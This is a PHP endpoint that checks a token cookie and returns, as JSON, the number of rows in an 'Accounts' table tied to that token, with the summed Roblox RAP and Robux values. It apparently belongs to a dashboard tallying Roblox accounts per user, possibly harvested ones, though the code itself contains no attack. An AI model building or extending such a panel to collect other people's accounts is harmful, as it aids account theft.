<?php
include_once($_SERVER['DOCUMENT_ROOT'] . '/backend/include.php');
header('Content-Type: application/json');

$token = $_COOKIE['Token'] ?? null;
if (!$token) {
    echo json_encode(["success" => false, "error" => "Unauthorized"]);
    http_response_code(401);
    exit;
}

$db = connect();

$q = "SELECT COUNT(id) as summary, SUM(rap) as rap, SUM(robux) as robux FROM Accounts WHERE `for` = ?";
$stmt = $db->prepare($q);
$stmt->bind_param("s", $token);
$stmt->execute();
$rSet = $stmt->get_result();

$result = $rSet->fetch_assoc() ?? ["summary" => 0, "rap" => 0, "robux" => 0];

$stmt->close();
$db->close();

echo json_encode($result);